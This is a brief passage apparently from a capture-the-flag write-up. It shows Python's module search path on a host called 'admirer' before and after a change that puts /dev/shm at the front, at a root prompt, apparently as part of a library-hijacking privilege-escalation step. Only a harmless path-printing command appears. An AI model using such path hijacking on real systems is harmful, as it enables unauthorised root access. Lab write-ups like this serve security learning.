/usr/lib/python3.5/plat-x86_64-linux-gnu
/usr/lib/python3.5/lib-dynload
/usr/local/lib/python3.5/dist-packages
/usr/lib/python3.5/dist-packages
```
<br> 
After.
```
root@admirer:/run/shm# python3 -c "import sys; print('\n'.join(sys.path))"
python3 -c "import sys ; print('\n'.join(sys.path))"

/dev/shm
/usr/lib/python35.zip
/usr/lib/python3.5
/usr/lib/python3.5/plat-x86_64-linux-gnu
/usr/lib/python3.5/lib-dynload
/usr/local/lib/python3.5/dist-packages
/usr/lib/python3.5/dist-packages
```

